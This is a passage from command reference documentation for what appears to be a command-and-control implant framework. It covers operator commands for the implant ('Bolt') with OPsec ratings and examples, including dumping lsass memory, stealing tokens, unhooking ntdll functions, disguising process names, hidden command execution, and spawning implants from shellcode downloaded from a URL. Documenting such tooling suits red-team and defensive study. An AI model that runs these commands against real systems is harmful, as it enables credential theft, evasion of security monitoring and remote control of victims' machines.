process names that CAN be selected when the filter does not have a PID
value.

If no PID setting is used, these values will be used in combination with
the other filter settings to find a target process.

The arguments can be a single entry or a list of comma seperated names.
Omitting the argument will clear the list.

This command changes the behavior of all command based functions and will
attempt to target a process with a name that matches one (case-insensitive)
or more in the supplied list. If none are found, all commands ran will
fail with an error.

Inverse of `parent_exclude`.

### Examples:

```shell
parent_include
parent_include explorer.exe
parent_include winlogon.exe,lsass.exe
```

## parent_name

```text
parent_name [name1,name2,nameX...]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter included target names. These represent the
process names that CAN be selected when the filter does not have a PID
value.

If no PID setting is used, these values will be used in combination with
the other filter settings to find a target process.

The arguments can be a single entry or a list of comma seperated names.
Omitting the argument will clear the list.

This command changes the behavior of all command based functions and will
attempt to target a process with a name that matches one (case-insensitive)
or more in the supplied list. If none are found, all commands ran will
fail with an error.

This function is an alias of `parent_include` and inverse of `parent_exclude`.

### Examples:

```shell
parent_name
parent_name explorer.exe
parent_name winlogon.exe,lsass.exe
```

## parent_pid

```text
parent_pid [pid]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Set the global parent filter PID. If the PID argument is omitted or empty,
the PID value is cleared.

PID settings on filters take precedence over all other settings.

This command changes the behavior of all command based functions and will
attempt to target the specified PID. If the PID no longer exists, all
commands ran will fail with an error.

### Examples:

```shell
parent_pid
parent_pid 1337
```

## patch_dll

```text
patch_dll [-r|--raw] [-f|--function <function>] <remote_dll_name> [data]
```

|       |                                   |
| ----- | --------------------------------- |
| OS    | Windows                           |
| OPsec | Safe-ish _(depends on arguments)_ |
| Admin | No                                |

Overwrite the memory region or function (if supplied) of the supplied DLL
name, eliminating any hooks placed on DLL functions.

A DLL name, such as ntdll, kernel32 or shell32 for example may be
specified. If a path is specified, the full path may be omitted if the
DLL is a well known DLL, such as shell32. The `.dll` extension may also
be omitted regardless of full path or name. Functions may be specified
with the `-f` argument.

Any source data in this command will be used as the patch data. If no
source is specified, this will load the file from the local client file
system. Any data passed to this command will be evaluated for Data
Specification Identifiers, but will default to a local file path.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The `--raw` option may be used to indicate that the passed bytes, file or
string is raw Assembly and should not be parsed by the DLL loader.

### Examples:

```shell
patch_dll ntdll
patch_dll ntdll.dll
patch_dll ntdll.dll -f NtCreateThreadEx b$\x40\x4E\x90
patch_dll C:/Windows/System32/shell32.dll -f ShellExecuteW
patch_dll kernel32.dll -f OpenProcess ~/local_kernel32.dll
```

## poweroff

```text
poweroff [-r|--reason <N>] [-t|--seconds <N>] [-f|--force] [message]
```

|       |                                  |
| ----- | -------------------------------- |
| OS    | Any                              |
| OPsec | _I guess?_                       |
| Admin | Maybe _(depends on permissions)_ |

Triggers a shutdown of the client device.

Force `-f` can be used to forcefully disconnect and shutdown the device,
preventing it from waiting based on running user programs.

The `-r` specifies the reason code, which determines what is written in
the Windows event log. Hex values for this option are accepted. This
option and the `-f` force option are only used for Windows clients.

The `-s` seconds value can be specified to delay the shutdown for the period
of time specified. If omitted, this defaults to zero.

Any text that is not an argument is taken as a message string that is
displayed to Windows clients in the "shutdown" message. This message may
use Data Specification Identifiers to display raw or Base64 data, but it
will not accept file paths. If no identifiers are found, it defaults to
a string.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
poweroff -r 0xFA -s 15
poweroff -s 30 All your base are belong to us!
```

## procdump

```text
procdump [pid | process_name] [output_file]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any except WASM             |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Dump the memory of a target process.

If the pid and/or name is not supplied, the parent filter will be used,
which can be updated with the filter commands.

If no pid or name is supplied and the parent filter is empty, this will
return an error.

### Examples:

```shell
procdump
procdump 1337
procdump httpd
procdump lsass.exe
```

## procname

```text
procname <name>
```

|       |                 |
| ----- | --------------- |
| OS    | Any except WASM |
| OPsec | Safe-ish        |
| Admin | No              |

Attempts to rename the process arguments to the provided string. On *nix
devices, the value cannot be longer than the current process name and will
be silently truncated if it's larger.

This will replace the "Command Line" value on Windows, but may not work
correctly if the build is a different architecture than the client.

### Examples:

```shell
procname apache2
procname [kernel]
procname C:\Windows\System32\rundll32.exe systemtask.ocx
```

## profile

```text
profile <name>
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Sets the client profile to the profile specified by the supplied name.

### Examples:

```shell
profile my-profile
```

## proxy

```text
proxy [-r|--remove] [-u|--update] <name> <address> <profile>
```

|       |                                |
| ----- | ------------------------------ |
| OS    | Any                            |
| OPsec | Safe _(Network logging?)_      |
| Admin | Maybe _(depends on port used)_ |

View, add or remove client-side proxies.

When not provided with any arguments, this function will return a list
of any proxies active on the client.

To remove a currently active Proxy instance, specify the `-r` argument
with the Proxy name.

To add a Proxy, supply a name, bind address and a profile to be used.

To update a Proxy, specify the `-u` argument along with the name and new
bind address to be used. The profile may be omitted if it does not need
to be changed.

_Depending on the build arguments of the client, it may only support a_
_single Proxy instance or may not support them at all._

### Examples:

```shell
proxy
proxy test1 0.0.0.0:8080 tcp-profile1
proxy -u test1 0.0.0.0:9090
proxy -r test1
```

## ps

```text
ps
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Retrieves a list of running processes on the client.

## pull

```text
pull [-a|--agent agent] [-o|--output local_path] [-r|--redirect] <url> [remote_path]
```

|       |                                                     |
| ----- | --------------------------------------------------- |
| OS    | Any                                                 |
| OPsec | **Not Safe! Disk Write (If a remote path is used)** |
| Admin | Maybe _(depends on target)_                         |

Downloads the file at the supplied URL (as the client) and save it to
the specified remote path. If a remote path is not used and the "-r" or
"--redirect" argument is used, the results will be returned instead. If
the "-o" argument is used, it will be saved to the supplied local file path.
Otherwise, the basename of the file will be used instead.

The `-a` or `--agent` argument may be specified to change the User-Agent
the client uses to connect to the server. String-Var Dynamic Values are
supported. If left empty, the default Firefox agent string will be used.

See [`help strvar`](StringValues.md) for more info on String-Var Dynamic Values.

### Examples:

```shell
pull google.com/robots.txt C:/robots.txt
pull -a 'Chrome/Webkit %90d.%90d.%10d %12d/%30d' example.com/file.txt file.txt
```

## pwd

```text
pwd
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Returns the client's current working directory.

## pwsh

```text
pwsh [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] [-f|--file] <command>
```

|       |                                                   |
| ----- | ------------------------------------------------- |
| OS    | Any                                               |
| OPsec | Maybe _(depends on command / PowerShell Logging)_ |
| Admin | Maybe _(depends on command)_                      |

Executes a command on the client as a PowerShell command will return the
PID, exit code and any stdout/stderr data once the process completes.

This handles the location of PowerShell automatically and fails if the
PowerShell binary cannot be found (both Windows and *nix).

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

The dollar sign `$` can be prefixed to a raw command instead to run as
a PowerShell command instead of using this function.

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed). This is
the same as running this command with the `hup` command.

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the "runas" command for more info.

If the `-f` or `--file` argument is specified, the command is evaluated
to detect any Data Specification Identifiers present and can be a raw string
value instead of a file. If no identifiers are found, this will default
to a local file path to be read and will be sent to the shell as input
to stdin.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
$Write-Host "hello"
pwsh Get-Host
pwsh Get-WmiObject -Class Win32_BIOS
pwsh -u bob@example -p password1 Get-Host
```

## reboot

```text
reboot [-r|--reason <N>] [-t|--seconds <N>] [-f|--force] [message]
```

|       |                                  |
| ----- | -------------------------------- |
| OS    | Any                              |
| OPsec | _I guess?_                       |
| Admin | Maybe _(depends on permissions)_ |

Triggers a reboot of the client device.

Force `-f` can be used to forcefully disconnect and reboot the device,
preventing it from waiting based on running user programs.

The `-r` specifies the reason code, which determines what is written in
the Windows event log. Hex values for this option are accepted. This
option and the `-f` force option are only used for Windows clients.

The `-s` seconds value can be specified to delay the reboot for the period
of time specified. If omitted, this defaults to zero.

Any text that is not an argument is taken as a message string that is
displayed to Windows clients in the "shutdown" message. This message may
use Data Specification Identifiers to display raw or Base64 encoded text,
but will not accept file paths. If no identifiers are found, it defaults
to a string.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
reboot -r 0xFA -s 15
reboot -s 30 All your base are belong to us!
```

## refresh

```text
refresh
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Refresh the client's system information and return the results back to
the server.

## regedit

```text
regedit <action> [-f|--force] <key> [value] [type] [data|int]
```

|       |                                             |
| ----- | ------------------------------------------- |
| OS    | Windows                                     |
| OPsec | Maybe _(depends on action / logging setup)_ |
| Admin | Maybe _(depends on action)_                 |

Retrieve, delete or modify data on the client system's registry.

The action argument specifies what to do and how many parameters are
required

Actions:

- **get**:
  Retrieve the data and type of the supplied key and value. The `value`
  option is required, use an empty string to specify the `(Default)` value.
- **ls** or **dir**:
  Retrieve a listing of the keys and values for the supplied key path.
  If `value` is specified, this will behave like a **get** action.
- **set**, **edit** or **update**:
  Set and/or update the registry value. If the value does not exist,
  create it. Any keys in the path will also be created. This option
  requires the `value` and `type` arguments to be specified, use an empty
  string to specify the `(Default)` value. If `data` is omitted, this
  will set the value as empty.
- **rm**, **rem**, **del** or **delete**:
  Delete the specified key or value (if `value` is not omitted). This
  will only delete non-empty keys if the `-f` or `--force` argument is
  specified.

Type can be one of the following:

- **sz** or **string**: `data` must be a string.
- **bin** or **binary**: `data` must be in a Data Specification Identifier format.
- **dword** or **uint32**: `data` must be a integer.
- **qword** or **uint64**: `data` must be a integer.
- **multi** or **multi_sz**: `data` must be a string, separate multiple entries
  with '\n' (newline). Recommended to use Raw Strings with `r$`.
- **exp_sz** or **expand_string**: `data` must be a string

Spaces in Registry paths and values require them to be enclosed in quotes.

Data passed to this command when setting value data will be evaluated for
Data Specification Identifiers, but will default to text. **THIS WILL NOT**
**HAPPEN WHEN THE DATATYPE IS AN INTEGER**.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The `key` argument takes both `reg.exe` and PowerShell registry hive
name conventions (ex: "HKLM:\System" and "HKLM\System" are equal.)

If `key` or `value` have spaces, they must be enclosed in double quotes.

### Examples:

```shell
regedit del "HKCU:\Control Panel\Desktop\My Key"
regedit set "HKCU:\Control Panel\Desktop" "Wallpaper" string "C:\lol.jpg"
regedit ls "HKCU\System\CurrentControlSet\Services"
regedit ls "HKLM\Hardware\Description\System\CentralProcessor"
```

## rename

```text
rename [new name]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Changes the display name of this Bolt to the supplied name. This new name will
be displayed on the Bolts menu and can be used in place of the Bolt ID value.
This will update the name for all currently connected operator sessions.

Names have a minimum of 4 characters and a maximum of 64 characters.

If the "new name" argument is omitted or empty, the name will be revered to the
Bolt ID.

The function in this menu will NOT add this name as a Hardware mapping. To
map a name to a Hardware ID, use the "rename" function in the Bolts menu.

Alias of `name`.

## rev2self

```text
rev2self
```

|       |         |
| ----- | ------- |
| OS    | Windows |
| OPsec | Safe    |
| Admin | No      |

Revert the token status to before any impersonation occurred. This would
be used to reset permissions after finished with an `elevate`, `steal` or
`make_token` command.

## rm

```text
rm [-f|--force] <remote_path>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Deletes a file at the specified path. The force flag `-f` or `--force`
may be used to delete recursively or delete non-empty directories.

Environment variables are processed on the client.

### Examples:

```shell
rm C:/directory
rm -f C:/my/file/path
```

## run

```text
run [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] <command>
```

|       |                              |
| ----- | ---------------------------- |
| OS    | Any                          |
| OPsec | Maybe _(depends on command)_ |
| Admin | Maybe _(depends on command)_ |

Executes a command on the client and will return the PID, exit code and
any stdout/stderr data once the process completes.

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed). This is
the same as running this command with the `hup` command.

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the `runas` command for more info.

### Examples:

```shell
run tasklist
run ping 127.0.0.1
run -u bob -p Password1 whoami /all
```

## runas

```text
runas [-x|--detach] [-d|--domain <domain>] <[domain\]user[@domain]> <pass> <command>
```

|       |                              |
| ----- | ---------------------------- |
| OS    | Any                          |
| OPsec | Maybe _(depends on command)_ |
| Admin | Maybe _(depends on command)_ |

Run the command with the supplied user credentials. The command will NOT
use any stored credentials and will only use the credentials specified.

If no password is required, use an empty string `""` or `''` as a placeholder.

The PID, exit code and any stdout/stderr data will be returned once the
process completes only IF the `-x` or `--detach` argument is used. Otherwise,
this will return after launching the process and will NOT gather any output
or exit code data.

If a domain is not specified with `-d` or `--domain`, it will be parsed
from the username. Common domain prefixes/suffixes are recognized, such
as:

- user@domain
- domain/user
- domain\user

If a domain is found, the username will be cleaned (without the domain)
and use and the domain will be used as the new domain value.

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set. Depending on the targeted parent,
this may error with "invalid handle" as the user specified might not have
permissions to access the parent targeted.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

### Examples:

```shell
runas bob Password123 tasklist
runas alice Password! whoami /all
runas joe@corp.com password1 .dir
runas -d example.com bob Password123 netstat -anop tcp
```

## screenshot

```text
screenshot [output_file]
```

|       |         |
| ----- | ------- |
| OS    | Windows |
| OPsec | Safe    |
| Admin | No      |

Takes a screenshot of the current desktop. This may fail if the client
is running in a service context. The file is saved as a PNG to the
supplied local path. If the path is empty, or omitted, a path based
on the current directory and the Bolt ID will be used instead.

### Examples:

```shell
screenshot
screenshot ~/screenshot-1.png
```

## script

```text
script <name>
```

|       |                              |
| ----- | ---------------------------- |
| OS    | _Depends on Script contents_ |
| OPsec | _Depends on Script contents_ |
| Admin | _Depends on Script contents_ |

Runs the script with the supplied name. The resulting output from the
script is depdent on it's settings.

### Examples:

```shell
script script1
script script_test
```

## set_hide

```text
set_hide [boolean]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Enable/Disable global shell command visibility. If no option is specified,
command windows are hidden. Can take multiple types of boolean values
(`true`, `T`, `t`, `yes`, `y`, `enable`, `e`, `1`).

### Examples:

```shell
set_hide
set_hide no
set_hide true
```

## shell

```text
shell [-x|--detach] [-u <user>] [-d <domain>] [-p <password>] [-f|--file] <command>
```

|       |                              |
| ----- | ---------------------------- |
| OS    | Any                          |
| OPsec | Maybe _(depends on command)_ |
| Admin | Maybe _(depends on command)_ |

Executes a command on the client as a shell command will return the
PID, exit code and any stdout/stderr data once the process completes.

This handles the location of system shell automatically.

The parent of this command can be controlled by the parent filter, which
can be updated with the filter commands. By default the parent will be
the current client process if not set.

This command is affected by the `set_hide` command, which by default
does not show any processes launched.

The period symbol `.` can be prefixed to a raw command instead to run as
a shell command instead of using this function.

This command is affected by any saved credentials (if no credentials are
specified manually. See below.)

If the `-x` or `--detach` argument is specified, the command will be ran
in "detached" mode and will return instantly and not be monitored. (This
also allows the process to live even when the client is closed). This is
the same as running this command with the `hup` command.

The additional `-u`, `-p` and `-d` arguments may be used to change the
user the process is executed as. See the `runas` command for more info.

If the `-f` or `--file` argument is specified, the command is evaluated
to detect any Data Specification Identifiers present and can be a raw string
value instead of a file. If no identifiers are found, this will default
to a local file path to be read and will be sent to the shell as input
to stdin.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
shell pwd
shell set
.whoami
.dir
```

## shutdown

```text
shutdown [-f|--force]
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Indicates to the current client that it should shutdown and release it's
resources.

Pass the `-f` or `--force` to force shutdown and do not ask for confirmation.

**THIS DOES NOT SHUTDOWN THE CLIENT DEVICE, USE `poweroff` INSTEAD.**

## show_window

```text
show_window [boolean]
```

|       |     |
| ----- | --- |
| OS    | n/a |
| OPsec | n/a |
| Admin | n/a |

Enable/Disable global shell command visibility. If no option is specified,
command windows are hidden. Can take multiple types of boolean values
(`true`, `T`, `t`, `yes`, `y`, `enable`, `e`, `1`).

Alias of `set_hide`.

### Examples:

```shell
show_window
show_window no
show_window true
```

## sleep

```text
sleep [duration]
```

|       |     |
| ----- | --- |
| OS    | Any |
| OPsec | n/a |
| Admin | n/a |

Update the sleep value for the client. The duration string by default is
in seconds, but can be suffixed with a `m`, `h` or `s` to indicate
minutes, hours or seconds, respectively.

If a forward slash `/` is specified, the jitter value may also be updated
at the same time. (The percent symbol `%` may be included or omitted.

If no value is specified, this displays the current sleep value.

### Examples:

```shell
sleep
sleep 5s
sleep 2m
sleep 30s/50
sleep 15s/20
```

## spawn

```text
spawn [pipe] [data]
      [-m|--method]     <method>
      [-t|--target]     <process_name | pid>
      [-n|--profile     <profile>
      [-f|--args]       <args>
      [-a|--agent]      <user-agent>
      [-R|--no-reflect]
      [-u|--user]       <[domain\]user[@domain]>
      [-d|--domain]     <domain>
      [-p|--password]   <password>
      [-e|--entry]      <function>
      [-z|--no-auto]
```

|       |                                                                     |
| ----- | ------------------------------------------------------------------- |
| OS    | Any                                                                 |
| OPsec | **Not Safe! (If a local file without reflect is used), Disk Write** |
| Admin | Maybe _(depends on method/target)_                                  |

Spawn a similar instance of this client using a type of method. The method
can be specified by the `-m` argument.

The `pipe` argument is required and specifies what pipe name to use to
connect to the new instance. (However if the `-P/--pipe` argument was
specified at runtime or through the `DOPPLER_PIPE` environment variable
the pipe value will be inferred from there and it may be omitted. This
action can be disable using the `-z/--no-auto` argument.) The pipe value
is most likely compiled into the client.

If any DLL or ASM files are specified using the Doppler command line, the
file will be used if no file path is specified. Doppler will perfer the ASM
payload over DLL, if specified. If no method is specified, it will default
to ASM or DLL if a file is specified.

By default, the current profile will be used, but can be changed by
specifying the name with the `-n` argument.

If the method is `self`, `exec` or `exe` the additional `-u`, `-p` and
`-d` arguments may be used to change the user the process is executed as.
See the `runas` command for more info.

Data Specification Identifiers may be used in the data arguments to this
command.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

The following methods are valid:

- **dll**:
  Use the data specified as a DLL migration method. This method requires
  a target to be specified as the host for the DLL. By default, if the
  `-R` or `--no-reflect` arguments are NOT supplied, this will convert
  the DLL data to assembly before sending it to the client. Otherwise the
  DLL will be written to disk before loading.
  If a remote path identifier is used instead, the `-R` and `--no-reflect`
  arguments are ignored.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain. This will only occur if the DLL is reflected and will be
  ignored if empty.
- **asm**:
  Use the data specified as assembly migrate code. This method requires
  a target to be specified as the host for the shellcode. If the data
  represents a DLL, this will convert the DLL to assembly before sending
  it to the client.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain (if the file is a DLL or DLL bytes).
- **exec** or **exe**:
  Execute a command as the migrate method. This is the default option
  if a method is not specified. If the special value `self` is used, this
  will use the current client binary path to execute instead.
- **pexec** or **url**:
  Download a payload and execute it as a migrate method. This works
  similar to the `dex` command and follows the same content rules.
  This method will be automatically selected if a URL is detected and
  no method is specified. To force the usage of this method, use `pexec`
  or `url` as the `-m` argument value.
  Similar to the `dex` command, the `-a` or `--agent` argument may be
  used to change the User-Agent used from the default value. See the
  `dex` or `pull` command for more info.
  If a target is specified and the downloaded type requires a target, it
  will be used, otherwise a random process will be chosen.
  If the download type is a command type the parent can be controlled by
  the parent filter, which can be updated with the filter commands. By
  default the parent will be the current client process if not set.
- **zombie**:
  Use the data specified as assembly migrate code in a zombified process.
  This method requires a command to be used as the host, supplied using the
  `-f` argument. The running binary must exist but the arguments may be
  random/invalid. If the data represents a DLL, this will convert the DLL
  to assembly before sending it to the client.
  The parent of the zombie process can be controlled by the parent filter,
  which can be updated with the filter commands. By default the parent
  will be the current client process if not set.
  The `-e` or `--entry` argument can be used to specify the function started
  after DLLMain (if the file is a DLL or DLL bytes).

The arguments for this command are similar to the `migrate` command.

### Examples:

```shell
spawn pipe-me self
spawn -m exec pipe-me
spawn -p my_profile -m dll pipe-me ~/implant.dll
spawn pipe-me <http://path.to.shell.code>
spawn -m url pipe-me path.to.shell.code
spawn -p my_profile -m asm ~/bolt.bin
spawn -m zombie -f notepad.exe ~/implant.dll
spawn -m self -u admin -p Password123 derp-me
```

## steal

```text
steal [pid | process_name]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Attempt to steal and use a token from the target process.

If the pid and/or name is not supplied, the parent filter will be used,
which can be updated with the parent commands.

If no pid or name is supplied and the parent filter is empty, this will
return an error.

Alias of `elevate`.

### Examples:

```shell
steal
steal 1337
steal lsass.exe
steal winlogon.exe
```

## touch

```text
touch <remote_path>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Creates an empty file at the remote destination, if it does not already
exist.

Environment variables are processed on the client.

### Examples:

```shell
touch C:/new-file.txt
```

## troll

```text
troll <block_input|bi|high_contrast|hc|swap_mouse|sm|wtf> [arg]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Windows                     |
| OPsec | Safe                        |
| Admin | Maybe _(depends on action)_ |

Performs a "troll" action. Many of these can be used to annoy/frustrate
the current user. Some actions may require elevated privileges.

If no enable/disable is specified, this commands defaults to `enable`.

The following are valid actions:

- **bi** or **block_input**:
  Blocks all user input (including the mouse), rending the console useless.
  This requires elevated privileges.
- **hc** or **high_contrast**:
  Swaps the current Windows theme to the high contrast theme.
- **sm** or **swap_mouse**:
  Swaps the left and right mouse buttons.
- **wtf**:
  Enables WTF mode. This causes all active windows on the current user
  session to change opacity, move, resize and minimize/maximize randomally
  for the specified duration (in seconds). If no duration is specified
  it will default to 30 seconds.

### Examples:

```shell
troll sm
troll hc false
troll block_input
```

## untrust

```text
untrust [pid | process_name]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Windows                     |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

"Untrust" the target. This will strip the process of all it's permissions
and will set the integrity level to Untrusted. This effectively nuters
the ability for a process to do anything.

If the pid and/or name is not supplied, the parent filter will be used,
which can be updated with the filter commands.

If no pid or name is supplied and the parent filter is empty, this will
return an error.

### Examples:

```shell
untrust
untrust 1337
untrust taskmgr.exe
```

## upload

```text
upload <data> [remote_path]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Upload a local file to the client at the supplied remote_path.

If the remote file path is omitted or empty, the basename of the current
file will be used and it will be placed in the client's current working
directory.

Environment variables are processed on the client (for the remote_path).

Data passed to this command will be evaluated for Data Specification
Identifiers, but will default to a local file.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
upload ~/file
upload ~/hacker_file.txt C:/file.txt
upload note.txt $USERPROFILE/Desktop/note.txt
```

## whoami

```text
whoami
```

|       |      |
| ----- | ---- |
| OS    | Any  |
| OPsec | Safe |
| Admin | No   |

Returns the current up-to-date username of the client without triggering
a refresh.

## wallpaper

```text
wallpaper <data>
```

|       |                                                          |
| ----- | -------------------------------------------------------- |
| OS    | Windows                                                  |
| OPsec | **Not Safe! (only if a local file is used), Disk Write** |
| Admin | No                                                       |

Changes the current user's wallpaper. The behavior of this command is
affected by the path specified. This function fails if the client is
not running in a Desktop session.

- If no Data Specification Identifier is found or the identifier indicates
  any identifier that is NOT external, the raw contents will be loaded
  into memory and sent to the client.  The wallpaper will be saved to
  disk before setting the new wallpaper.
- If the data contains a Remote File Path Data Specification Identifier,
  path will be sent to the client to load the path directly from disk.
  This will process local client environment variables.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
wallpaper ~/troll.png
wallpaper x$C:/Windows/web/web1.jpg
```

## window

```text
window <ls|close|disable|enable|focus|input|msgbox|move|show|trans>
|      [handle|all|*|0
|      [args..]
```

|       |                             |
| ----- | --------------------------- |
| OS    | Windows                     |
| OPsec | Safe                        |
| Admin | Maybe _(depends on target)_ |

Performs an Windows window manager action. The supplied `handle` argument
is optional for the `ls` and `get` calls and can be replaced with `all`
(or `0`), which will target all top level windows currently open when the
command executes.

Window handles do not change unless the window is closed/reopened, so they
may be reused without an additional call to `window ls`.

The following are valid actions:

- **ls** or **get**:
  Retrieves the list of windows to choose from. This command also retrieves
  the window position, title and size.
- **cl** or **close**:
  Close the target window(s) using a WM_DESTROY message. The `all`, `*`
  or `0` handle may be used for this comand to select all current windows.
- **dis** or **disable**:
  Disables a window. This prevents the user from interacting with the
  window itself. The `all`, `*` or `0` handle may be used for this
  comand to select all current windows.
- **desktop**:
  This is an alias for `window show all minimized` and will show the
  user's desktop by minimizing all windows.
- **en** or **enable**:
  Enables a window. This allows a previously disabled window to be used
  again after a disable command. The `all`, `*` or `0` handle may be used
  for this comand to select all current windows.
- **fg** or **focus**:
  Focuses the window and brings user input to it. This command requires
  a handle and can only be used on a single window at a time.
- **in**, **input** or **type**:
  Simulates keystrokes in order to type the message after the action. Capital
  and spaces are preserved. If a valid window handle is specified, this will
  force focus of the specified window before typing.
- **mb**, **msg**, **msgbox**, **message** or **messagebox**:
  Show a MessagBox prompt as a child of the supplied window handle. A
  handle of 0 (or using `all`) will make a standalone MessageBox.
  Using `-1` or `desktop` will attempt to target the current Desktop.
  The first argument is the MessageBox title, which is the only required
  argument. The second argument is the message content and the third is
  the dialog type, which is an int flag. Both of these are optional and
  will default to `""` and `0`.
  The title and text options support using raw or Base64 data using
  Data Specification Identifiers. They do not support file paths.
  See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.
- **mv**, **pos**, **move**, **size** or **resize**:
  Moves the target window. This is a function that does not allow `all`
  `*` or 0 to be specified as the target can only be a single window.
  The arguments to this command are the new X and Y position and the last
  two arguments are the optional new width and height which if omitted,
  will not change the window size.
  The value `-1` can also be used in place for either the `x` and `y` or
  the `width` and `height` to ignore setting that value and leaving it
  as the current value.
- **sw** or **show**:
  Sets the window visibility state. The argument to this action is the
  visibility state. A number of a `Sw*name` may be used _(without the "Sw")_,
  such as `minimized` or `maximized`. The `all`, `*` or `0` handle may
  be used for this comand to select all current windows.
- **tr**, **trans** or **transparent**:
  Sets the transparency level of the window as an argument. This value
  may be `0` (completely transparent) to `255` (opaque).
  This value may be specified as a percentage with `%` instead which
  the level will be computed from. If no value is specified, zero
  (transparent) is assumed.
  The `all`, `*` or `0` handle may be used for this comand to select all
  current windows.

### Examples:

```shell
window ls
window dis all
window enable 6DF26
window transparent 3763A6 50%
window msg 0 "Hello There!" "Hello World!"
window sw all hide
window size 7836A -1 -1 100 500
window mv 7483FE 10 10 -1 -1
window pos 84A23 200 200 500 750
```

## workhours

```text
workhours [-d|--days <SMTWRFS>] [-s|--start <HH:MM>] [-e|--end <HH:MM>]
```

|       |     |
| ----- | --- |
| OS    | Any |
| OPsec | n/a |
| Admin | n/a |

Update the client working hours and/or days. The values set by this command
are specified by arguments instead of directly to avoid confusion.

The `-d`/`--days` argument specifies a day value string that specifies the
days this client may operate on. This takes the form of a `SMTWRFS` string
(Sunday as the first day). The day values do not have to be in order except
for Sunday (S) which MUST be the first `S` in order to be detected. If empty
or ignored, this is treated as all days or `SMTWRFS`.

The `-s`/`--start` argument takes a value in the form of `HH:MM` which
specifies the time this client may start operating. If this value is omitted
or empty it will be treated as the start of the next avaliable working
or enabled day.

The `-e`/`--end` argument takes a value in the form of `HH:MM` which
specifies the time this client must stop operating. If this value is omitted
or empty it will be treated as midnight and the client will stop operating
if the next day is not avaliable OR if start hours are set, which it will
wait for the start hours to be valid first.

If no arguments are specified, this will display the current working hours
settings.

### Examples:

```shell
workhours
workhours -s 9:30 -e 16:30
workhours -d SMTFS -e 18:30
workhours -d MFWRF -s 8:45 -e 17:30
```

## write

```text
write <data> <remote_path>
```

|       |                             |
| ----- | --------------------------- |
| OS    | Any                         |
| OPsec | **Not Safe! Disk Write**    |
| Admin | Maybe _(depends on target)_ |

Write the supplied contents to the remote path. This will overrite
the contents if the current path exists.

Data passed to this command will be evaluated for Data Specification
Identifiers, but will default to text.

See [`help data`](Identifiers.md) for more info on Data Specification Identifiers.

### Examples:

```shell
write "hello world!" C:/hello.txt
```

## wts

```text
wts <ls|ps|logoff|dis|disconnect|msg|message>
|   [session]
|   [-f|--flags]   <flags>
|   [-w|--wait]
|   [-t|--seconds] <seconds>
|   [title]
|   [text]
```

|       |                                     |
| ----- | ----------------------------------- |
| OS    | Any _(ps/actions are Windows only)_ |
| OPsec | Safe                                |
| Admin | Maybe _(depends on session target)_ |

Allows for listing user Logins on any device and advanced functions on Windows
devices like Disconnect, Logoff and Message.

The wts command takes an action argument, which determines what parameters
it will accept.

The special Session ID `-1` can be used in place of a valid Session ID
to select the current session the client is in. The values `cur` and
`current` also have the same effect.

Currently the following actions are accepted:

- **ls**:
  List the current user sessions on the client. This works with any OS.
- **ps** [session]:
  (Windows Only) List the processes running under a user login session.
